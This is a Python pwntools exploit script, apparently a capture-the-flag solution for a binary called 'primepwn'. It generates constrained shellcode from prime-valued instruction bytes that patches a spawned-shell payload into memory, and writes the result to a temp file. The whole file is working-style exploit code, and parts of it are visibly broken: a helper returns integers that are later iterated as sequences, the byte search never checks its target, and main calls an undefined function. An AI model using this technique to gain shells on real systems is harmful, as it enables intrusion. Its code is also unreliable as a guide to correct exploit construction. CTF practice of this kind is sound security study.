from pwn import *
from heapq import *

with open("./primepwn",'rb') as f:
    data=f.read(0xa70)

def gen_primes(lower, upper):
    primes=()
    for num in xrange(lower,upper+1):
        assert(num > 1), "Number must be grater 1!"
        for j in xrange(2,num):
            if (num%j) == 0:
                break
        else: 
            primes+=(num,)
    return primes

PRIMES=gen_primes(2,255)

def gen_byte_generators():
    res={}
    for i in range(256):
        for a in range(len(PRIMES)):
            for b in range(a,len(PRIMES)):
                for c in range(b,len(PRIMES)):
                    if PRIMES[a]^PRIMES[b]^PRIMES[c]:
                        res[i]=PRIMES[a]^PRIMES[b]^PRIMES[c]
                        break
                else:
                    continue
                break
            else:
                continue
            break
        else:
            print('[!] no result for %d' % i)
    return res


bin_consts=tuple((0x400000 + i, u32(data[i:i + 4])) for i in range(0, len(data), 4))
s, t = set(), []
for x in bin_consts:
    if x[1] not in s:
        t.append(x)
    s.add(x[1])

bin_consts=tuple(t)

class CPU():
    def __init__(self):
        self.eax=0x1337000
        self.ebx=0
        self.ecx=0x194
        self.esi=0x603020
        self.edi=0x1337000

cpu=CPU()

def and_eax(n):
    global cpu
    cpu.eax &= n
    return b'\x25' + p32(n)

def xor_eax(n):
    global cpu
    cpu.eax ^= n
    return b'\x35' + p32(n)

def zero_eax():
    return and_eax(0x02020202) + and_eax(0x05050505)

def xchg_eax_edi():
    global cpu
    cpu.eax, cpu.edi = cpu.edi, cpu.eax
    return b'\x97'

byte_generators = gen_byte_generators()
def set_eax(n, prev=None):
    res = b''
    if prev is None:
        # res += zero_eax()
        n ^= cpu.eax
    else:
        n ^= prev
    b0, b1, b2, b3 = (n >> 0) & 0xFF, (n >> 8) & 0xFF, (n >> 16) & 0xFF, (n >> 24) & 0xFF
    g0, g1, g2, g3 = byte_generators[b0], byte_generators[b1], byte_generators[b2], byte_generators[b3]
    for a, b, c, d in zip(g0, g1, g2, g3):
        res += xor_eax((a << 0) + (b << 8) + (c << 16) + (d << 24))
    return res

def zero_edi():
    return zero_eax() + xchg_eax_edi()

def set_edi(n, prev=None):
    return set_eax(n, prev) + xchg_eax_edi()

def mov_ebx_ptr(addr):
    # shit, no ebx emul
    return set_edi(addr) + b'\x8b\x1f'

def add_ebx_ptr(addr):
    # shit, no ebx emul
    return set_edi(addr) + b'\x03\x1f'

def zero_ebx():
    # shit, no ebx emul
    for x in bin_consts:
        if x[1] == 0:
            return mov_ebx_ptr(x[0])


def set_ebx(n, max_iters=1000):
    q=[]
    was=set()
    for x in bin_consts:
        if n>x[1]:
            heappush(q,(n-x[1],(x,)))
    res, iters=None, 0
    while q and iters < max_iters:
        iters+=1
        now_sum, now=heappop(q)
        now_sum = n-now_sum
        if now_sum == n and (res is None or len(now) < len(res)):
            res=now
        was.add(now_sum)
        for x in bin_consts:
            if now_sum + x[1] <= n and now_sum + x[1] not in was:
                heappush(q,(n-now_sum-x[1], now+(x,)))
    return zero_ebx()+b''.join(add_ebx_ptr(x[0]) for x in res)
            
# \x89\x1f: mov dword ptr [rdi], ebx

def patch_dword(addr, val):
    return set_ebx(val)+set_edi(addr)+b"\x89\x1f"    

def main():
    context.arch='amd64'
    second_stage=asm(shellcraft.sh())

    while len(second_stage) % 4:
        second_stage += b"\x90"
    first_stage=b''

    for i in range(0,len(second_stage),4):
        first_stage += patch_dword(0x1337c00 + i, u32(second_stage[i:i+4]))
    
    with open("/tmp/dump.bin","wb") as f:
        f.write(first_stage)

    '''
    for i in range(0, len(second_stage),4):
        first_stage+=patch_dword(0x1337c00+i, u32(second_stage[i:i+4]))
    '''
    bytes=gen_byte_generator()
    print bytes
if __name__ == '__main__':
    main()
